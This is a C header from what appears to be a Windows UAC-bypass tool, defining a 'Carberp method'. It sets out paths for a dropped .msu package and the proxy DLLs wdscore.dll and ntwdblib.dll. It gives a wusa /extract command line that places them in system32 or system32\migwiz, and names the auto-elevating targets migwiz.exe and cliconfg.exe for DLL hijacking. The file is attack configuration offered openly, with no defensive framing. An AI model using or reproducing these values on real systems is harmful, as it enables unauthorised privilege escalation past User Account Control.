/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015
*
*  TITLE:       CARBERP.H
*
*  VERSION:     1.50
*
*  DATE:        05 Apr 2015
*
*  Prototypes and definitions for Carberp method.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#define METHOD_CARBERP_MSUPACKAGE	L"%temp%\\huy32.msu"
#define METHOD_MIGWIZ_SOURCEDLL		L"%temp%\\wdscore.dll"
#define METHOD_MIGWIZ_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"
#define METHOD_MIGWIZ_TARGETAPP		L"%systemroot%\\system32\\migwiz\\migwiz.exe"

#define METHOD_SQLSVR_SOURCEDLL		L"%temp%\\ntwdblib.dll"
#define METHOD_SQLSVR_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32"
#define METHOD_SQLSVR_TARGETAPP		L"%systemroot%\\system32\\cliconfg.exe"

BOOL ucmWusaMethod(
	DWORD dwType,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	);

BOOL ucmWusaCopyFile(
	LPWSTR lpSourceDll,
	LPWSTR lpMsuPackage,
	LPWSTR lpCommandLine,
	PVOID FileBuffer,
	DWORD FileBufferSize
	);
